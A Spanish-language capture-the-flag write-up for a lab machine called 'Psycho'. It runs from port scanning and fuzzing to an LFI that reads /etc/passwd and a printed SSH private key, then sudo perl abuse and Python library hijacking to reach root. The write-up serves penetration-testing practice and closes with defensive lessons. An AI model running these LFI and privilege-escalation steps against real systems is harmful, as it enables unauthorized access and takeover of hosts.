# Máquina Vulnerable: Psycho

|                   | Detalle maquina original                        |
| ----------------- | ----------------------------------------------- |
| Autor             | Luisillo_o                                      |
| Dificultad        | Fácil                                           |
| Fecha de creación | 10/08/2024                                      |
| Fecha del writeup | 15/12/2025                                      |
| Maquina original  | Psycho                                          |

Máquina CTF diseñada para practicar técnicas de pentesting básicas en un entorno controlado. Esta réplica implementa vulnerabilidades típicas que incluyen Local File Inclusion (LFI), exposición de claves SSH privadas y técnicas de escalada de privilegios mediante Python library hijacking.

El objetivo es practicar metodologías de pentesting desde el reconocimiento inicial hasta la escalada de privilegios, utilizando herramientas estándar como nmap, gobuster, ffuf y técnicas de explotación basadas en manipulación de módulos de Python.

## Tabla de Contenidos

- [Explotación](#explotación)
  - [Vulnerabilidades Implementadas](#vulnerabilidades-implementadas)
- [Write-up Completo](#write-up-completo)
  - [Diagrama de Ataque](#diagrama-de-ataque)
  - [Paso 1: Reconocimiento - Escaneo de Puertos](#paso-1-reconocimiento---escaneo-de-puertos)
  - [Paso 2: Enumeración Web - Fuzzing de Directorios](#paso-2-enumeración-web---fuzzing-de-directorios)
  - [Paso 3: Fuzzing de Parámetros GET](#paso-3-fuzzing-de-parámetros-get)
  - [Paso 4: Explotación de LFI](#paso-4-explotación-de-lfi)
  - [Paso 5: Extracción de Clave SSH Privada](#paso-5-extracción-de-clave-ssh-privada)
  - [Paso 6: Acceso SSH como vaxei](#paso-6-acceso-ssh-como-vaxei)
  - [Paso 7: Escalada a Usuario luisillo](#paso-7-escalada-a-usuario-luisillo)
  - [Paso 8: Análisis del Script Python](#paso-8-análisis-del-script-python)
  - [Paso 9: Python Library Hijacking para Root](#paso-9-python-library-hijacking-para-root)
- [Conclusión](#conclusión)

---

## Explotación

### Vulnerabilidades Implementadas

- **Local File Inclusion (LFI)**: Parámetro `secret` vulnerable en `index.php` que permite lectura arbitraria de archivos
- **Exposición de Credenciales**: Clave SSH privada accesible mediante LFI en `/home/vaxei/.ssh/id_rsa`
- **Configuración sudo Insegura**: Usuario vaxei puede ejecutar `/usr/bin/perl` como luisillo sin contraseña
- **Python Library Hijacking**: Script ejecutable con sudo importa módulo `subprocess` desde ruta manipulable
- **Permisos de Escritura Inadecuados**: Directorio `/opt` con permisos de escritura para usuario regular

---

## Write-up Completo

### Diagrama de Ataque

```mermaid
graph TD
    A["Inicio: Reconocimiento"] --> B["nmap -p- -sV"]
    B --> C{"Puertos Abiertos"}
    C --> D["Puerto 80: HTTP"]
    C --> E["Puerto 22: SSH"]

    D --> F["Fuzzing con Gobuster"]
    F --> G["/index.php encontrado"]

    G --> H["Fuzzing de parámetros GET con ffuf"]
    H --> I["Parámetro 'secret' descubierto"]

    I --> J["LFI: /etc/passwd"]
    J --> K["Usuarios: vaxei, luisillo"]

    K --> L["LFI: /home/vaxei/.ssh/id_rsa"]
    L --> M["Clave privada SSH extraída"]

    M --> N["ssh vaxei@172.17.0.2 -i cert"]
    E --> N

    N --> O["sudo -l como vaxei"]
    O --> P["/usr/bin/perl ejecutable como luisillo"]

    P --> Q["sudo -u luisillo perl -e 'exec /bin/bash'"]
    Q --> R["Acceso como luisillo ✓"]

    R --> S["sudo -l como luisillo"]
    S --> T["/usr/bin/python3 /opt/paw.py ejecutable como root"]

    T --> U["Análisis de paw.py"]
    U --> V["Detectado: import subprocess"]

    V --> W["Python Library Hijacking"]
    W --> X["Crear /opt/subprocess.py malicioso"]
    X --> Y["sudo python3 /opt/paw.py"]

    Y --> Z["ROOT ACCESS ✓"]
```

### Paso 1: Reconocimiento - Escaneo de Puertos

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 16:18 EST
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

**Resultado**: Se identifican dos puertos abiertos:
- **Puerto 80 (HTTP)**: Apache httpd 2.4.58 (Ubuntu)
- **Puerto 22 (SSH)**: OpenSSH 9.6p1 Ubuntu

### Paso 2: Enumeración Web - Fuzzing de Directorios

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/index.php            (Status: 200) [Size: 2596]
/server-status        (Status: 403) [Size: 275]
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```

**Resultado**: Se descubre `index.php` y directorio `/assets/`

### Paso 3: Fuzzing de Parámetros GET

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.17.0.2/index.php?FUZZ=nada

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?FUZZ=nada
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2596, Words: 674, Lines: 63, Duration: 0ms]
.hta                    [Status: 200, Size: 2596, Words: 674, Lines: 63, Duration: 0ms]
```

Filtrando respuestas por tamaño:

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.17.0.2/index.php?FUZZ=nada -fs 2596

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?FUZZ=nada
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2596
________________________________________________

secret                  [Status: 200, Size: 2582, Words: 671, Lines: 63, Duration: 22ms]
```

**Resultado**: Parámetro `secret` descubierto

### Paso 4: Explotación de LFI

Probando valores para el parámetro `secret`:

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://172.17.0.2/index.php?secret=FUZZ -fs 2582

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?secret=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2582
________________________________________________

/etc/passwd             [Status: 200, Size: 3870, Words: 678, Lines: 89, Duration: 5ms]
```

Extrayendo `/etc/passwd`:

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://172.17.0.2/index.php?secret=/etc/passwd
<!DOCTYPE html>
<html lang="en">
....
</html>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
luisillo:x:1002:1002::/home/luisillo:/bin/sh
```

**Resultado**: Usuarios identificados: `vaxei` y `luisillo`

**Nota importante**: Esta LFI acepta rutas absolutas directamente (e.g., `/etc/passwd`). Si no funcionara, se pueden usar técnicas de path traversal como `../../../etc/passwd` para asegurar que se alcance el archivo desde cualquier directorio base.

### Paso 5: Extracción de Clave SSH Privada

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://172.17.0.2/index.php?secret=../../../home/vaxei/.ssh/id_rsa
<!DOCTYPE html>
<html lang="en">
...
</html>

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk
2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3
tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF
ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8
t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa
OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM
2fftTd/dPkOAIFe2p+lqrQlw9tFlPk7dPbmhVsM1CN+DkY5D5XDeUnzICxKHCsc+/f/cmA
UafMqBMHtB1lucsW/Tw2757qp49+XEmic3qBWes1AAAFiGAU0eRgFNHkAAAAB3NzaC1yc2
EAAAGBAL2zeGTmgAhtMAOS2PtkZT6U5gZdLwVbn7IR58yM0CIgUoGVBA+Q5Ni8TQXc0rUA
QMemTLA/o1AlNNg1HzltAOwUFKz/z6q2fi2hoHgTXFWcMn2iZbxyctjC1Wd7Zq5z1EWAhH
EPuGhqBsnuKM4GqPhXSRJR99bddFWGj1/m2V/m0sWK5+r0Kdg425f5qF7VhQAoA3iRrmCS
HWARoYet/hPoXD5mYDL1w8R/KOr4AhYq1yJ8bNztNx9pAdS8FlWPWRXZRIfLd0K5lOkmYf
6d3Ni9Z6PuHsrwtlQrbhdt9uvXHklQqpCsz/bLynu1Qqh/X2EVq+7LLLkKmjma/Dlc6ZOy
hNAOHJOJAEC4pplM6TpbQ5z/AMvJRwJ0TM7lySQrZWheUefANp4BE5AYwzDNn37U3f3T5D
gCBXtqfpaq0JcPbRZT5O3T25oVbDNQjfg5GOQ+Vw3lJ8yAsShwrHPv3/3JgFGnzKgTB7Qd
ZbnLFv08Nu+e6qePflxJonN6gVnrNQAAAAMBAAEAAAGADK57QsTf/priBf3NUJz+YbJ4NX
5e6YJIXjyb3OJK+wUNzvOEdnqZZIh4s7F2n+VY70qFlOtkLQmXtfPIgcEbjyyr0dbgw0j4
4sRhIwspoIrVG0NTKXJojWdqTG/aRkOgXKxsmNb+snLoFPFoEUHZDjpePFcgyjXlaYmZ0G
+bzNv0RNgg4eWZszE13jvb5B8XtDzN4pkGlGvK1+8bInlguLmktQKItXoVhhokGkp4b+fu
7YjDiaS4CyWsxX50wG/ZMgYBwFLRbCDUUdKZxsmCbreHxLKT/sae64E2ahuBSckYZlIzTd
2lp27EOOPvdPlt9gny83JuFHBLChMd4sHq/oU8vGAiGnIvOCWs4wMArbpJQ+EALJk3GYvh
oqWp3Q4N4F1tmwlrbqX2KP2T5yB+rLoBxfJwLELZlzd+O8mfP9Yknaw2vVYpUixUglNWHJ
ZnmN1uAScPAd1ZNvIkPm6IPcThj1hVCkFXgWjQn6NdJj+NGNWcBeUrxBkH0vToD7gfAAAA
wQCvSzmVYSxpX3b9SgH+sHH5YmOXR9GSc8hErWMDT9glzcaeEVB3O2iH/T+JrtUlm4PXiP
kwFc5ZHHZTw2dd0X4VpE02JsfkgwTEyqWRMcZHTK19Pry2zskVmu6F94sOcN8154LeQBNx
gT22Dr/KJA71HkOH7TyeGnlsmBtZoa3sqp3co9inkccnhm1KUeduL4RcSysDqXYbBUtNB6
G1l8HYysm8ISCsoR4KSgxmC5lqCMfBy7z/6nOX7sm5/kP+JMsAAADBAO8TiHrYTl/kGsPM
ITaekvQUJWCp+FCHK07jwzNp4buYAnO3iGvhVQpcS7UboD8/mve207e97ugK4Nqc68SzSu
bDgAnd4FF3NLoXP/qPZPaPS1FRl0pY0jHyB+U6RELgaI34i9AierMc+4M0coUMZvxqay3o
t8jRhz08jiwFifszwNN7taclmNEfkrKBY7nlbxFRd2XLjknZHFUOFzOFWdtXilQa+y6qJ6
lKtE9KWnQgIgZB9Wt+M3lsEVWEdQKN1wAAAMEAyyEsmbLUzkBLMlu6P4+6sUq8f68eP3Ad
bJltoqUjEYwe9KOf07G15W2nwbE/9WeaI1DcSDpZbuOwFBBYlmijeHVAQtJWJgZcpsOyy2
1+JS40QbCBg+3ZcD5NX75S43WvnF+t2tN0S6aWCEqCUPyb4SSQXKi4QBKOMN8eC5XWf/aQ
aNrKPo4BygXUcJCAHRZ77etVNQY9VqdwvI5s0nrTexbHM9Rz6O8T+7qWgsg2DEcTv+dBUo
1w8tlJUw1y+rXTAAAAEnZheGVpQDIzMWRlMDI2NmZmZA==
-----END OPENSSH PRIVATE KEY-----
```

Guardando la clave:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ vi cert

┌──(kali㉿kali)-[~/Desktop]
└─$ chmod 600 cert
```

**Resultado**: Clave privada SSH extraída y preparada

### Paso 6: Acceso SSH como vaxei

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh vaxei@172.17.0.2 -i cert
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
vaxei@0dd5505778e0:~$
```

**Resultado**: Acceso exitoso como usuario `vaxei`

### Paso 7: Escalada a Usuario luisillo

```bash
vaxei@0dd5505778e0:~$ sudo -l
Matching Defaults entries for vaxei on 0dd5505778e0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on 0dd5505778e0:
    (luisillo) NOPASSWD: /usr/bin/perl
```

**Resultado**: Usuario puede ejecutar `perl` como luisillo sin contraseña

Consultando [GTFOBins para Perl](https://gtfobins.github.io/gtfobins/perl/#sudo):

```bash
vaxei@0dd5505778e0:~$ sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'
luisillo@0dd5505778e0:/home/vaxei$ whoami
luisillo
```

**Resultado**: Escalada exitosa a usuario `luisillo`

### Paso 8: Análisis del Script Python

```bash
luisillo@0dd5505778e0:/home/vaxei$ sudo -l
Matching Defaults entries for luisillo on 0dd5505778e0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 0dd5505778e0:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

Probando el script:

```bash
luisillo@0dd5505778e0:/home/vaxei$ sudo python3 /opt/paw.py
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
```

Analizando el código:

```bash
luisillo@0dd5505778e0:/home/vaxei$ cat /opt/paw.py
import subprocess
import os
import sys
import time

# F
def dummy_function(data):
    result = ""
    for char in data:
        result += char.upper() if char.islower() else char.lower()
    return result

# Código para ejecutar el script
os.system("echo Ojo Aqui")

# Simulación de procesamiento de datos
def data_processing():
    data = "This is some dummy data that needs to be processed."
    processed_data = dummy_function(data)
    print(f"Processed data: {processed_data}")

# Simulación de un cálculo inútil
def perform_useless_calculation():
    result = 0
    for i in range(1000000):
        result += i
    print(f"Useless calculation result: {result}")

def run_command():
    subprocess.run(['echo Hello!'], check=True)

def main():
    # Llamadas a funciones que no afectan el resultado final
    data_processing()
    perform_useless_calculation()

    # Comando real que se ejecuta
    run_command()

if __name__ == "__main__":
    main()
```

**Resultado**: El script importa `subprocess` y se ejecuta desde `/opt/`

### Paso 9: Python Library Hijacking para Root

Comprobando permisos en `/opt/`:

```bash
luisillo@0dd5505778e0:/home/vaxei$ cd /opt/
luisillo@0dd5505778e0:/opt$ ls
paw.py
```

Python busca módulos en el directorio actual primero. Creando módulo malicioso:

```bash
luisillo@0dd5505778e0:/opt$ echo "import os; os.system('/bin/bash')" > subprocess.py
luisillo@0dd5505778e0:/opt$ ls
paw.py  subprocess.py
```

Ejecutando con privilegios root:

```bash
luisillo@0dd5505778e0:/opt$ sudo python3 /opt/paw.py
root@0dd5505778e0:/opt# whoami
root
```

**Resultado**: Escalada exitosa a root mediante Python library hijacking ✓

---

## Conclusión

Esta máquina demuestra vulnerabilidades comunes en aplicaciones web y configuraciones del sistema:
- Local File Inclusion (LFI) que permite acceso a archivos sensibles
- Exposición de claves SSH privadas
- Configuraciones sudo inseguras que permiten ejecución de intérpretes
- Python library hijacking mediante manipulación del orden de búsqueda de módulos

**Lecciones aprendidas:**
- Validar y sanitizar todos los parámetros de entrada en aplicaciones web
- Proteger archivos sensibles con permisos adecuados (especialmente claves SSH)
- Restringir permisos sudo a comandos específicos y evitar intérpretes de lenguajes
- Controlar permisos de escritura en directorios del sistema (como `/opt/`)
- No ejecutar scripts con sudo desde directorios donde usuarios regulares pueden escribir
- Python importa módulos primero desde el directorio actual, lo que puede ser explotado
